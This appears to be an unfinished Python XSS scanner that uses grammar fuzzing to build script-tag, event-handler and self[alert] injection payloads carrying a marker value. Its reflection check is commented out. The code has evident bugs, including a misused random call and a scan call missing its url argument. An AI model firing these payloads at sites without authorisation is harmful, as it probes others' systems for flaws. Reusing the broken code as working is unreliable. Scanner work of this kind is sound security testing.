from a import simple_grammar_fuzzer

class xssPayload:

    def __init__(self):
        self.payloads = set()
        self.detect = "111111111111111"
    
    def generator(self, GRAMMAR):
        return set([simple_grammar_fuzzer(GRAMMAR) for i in range(50)])


    # payload formmat: "><script>alert(1)</script>
    def generator_xss_1(self):
        XSS_PAYLOAD1 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@quote@@specialCharacter@<script>@command@</script>"],
            "@quote@" : ["\"", "'"],
            "@specialCharacter@" : [">"],
            "@command@" : ["alert(111111111111111)", "prompt(111111111111111)", "document.write(111111111111111)", "console.log(111111111111111)"]
        }
        return self.generator(XSS_PAYLOAD1)

    
    def generator_xss_4(self):
        XSS_PAYLOAD4 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@tag@@src@@space@@event@@quote@@command@@quote@"],
            "@tag@" : ["<a ", "<img ", "<iframe ", "<div "],
            "@src@" : ["src=hihi ", "href=hihi "],
            "@quote@" : ["\"", "'"],
            "@space@" : ["", " "],
            "@event@" : ["onunload=", "onscroll=", "onfocus=", "onclick=", "onmouseover=", "onmouseout=", "onload=", "onerror=" , "onresize=", "onrropertychange=", "onpagehide="],
            "@command@" : ["alert(111111111111111)", "prompt(111111111111111)", "document.write(111111111111111)", "console.log(111111111111111)"]
        }
        return self.generator(XSS_PAYLOAD4)

    #payload format: " onload="javascript:alert(1)"
    def generator_xss_2(self):
        XSS_PAYLOAD2 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@quote@@space@@event@@command@@quote@"],
            "@quote@" : ["\"", "'"],
            "@space@" : ["", " "],
            "@event@" : ["onunload=", "onscroll=", "onfocus=", "onclick=", "onmouseover=", "onmouseout=", "onload=", "onerror=" , "onresize=", "onrropertychange=", "onpagehide="],
            "@command@" : ["alert(111111111111111)", "prompt(111111111111111)", "document.write(111111111111111)", "console.log(111111111111111)"]
        }
        return self.generator(XSS_PAYLOAD2 )

    #payload include global variable like: self, ...
    def generator_xss_3(self):
        XSS_PAYLOAD3 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@global@[@command@](@value@)"],
            "@global@" : ["self"],
            "@command@" : ["alert", "prompt"],
            "@value@" : ["111111111111111"]
        
        }
        return self.generator(XSS_PAYLOAD3)

    def generator_xss(self):
        pass
    

    def scan(self, level, url): #link, method):
        #conn = connect()
        self.payloads.update(self.generator_xss_1())
        self.payloads.update(self.generator_xss_4())
        self.payloads.update(self.generator_xss_3())
        self.payloads.update(self.generator_xss_2())
        payloads = list(self.payloads)
        listPayload = []
        for i in payloads:
            j = random(0, len(payloads)) # get ramdomly payload from list payload
            if payloads[j] not in listPayload:
                listPayload.append(payloads[j])
                '''
                source = conn.normal_POST(url, params, payload[j])
                source = conn.render_GET(url, payloads[j])
                if payloads[j] in source:
                    return True          #--------------------> Có lỗi
                else:
                    return False         #--------------------> Không có lỗi
                '''
        


a = xssPayload()
a.scan(1)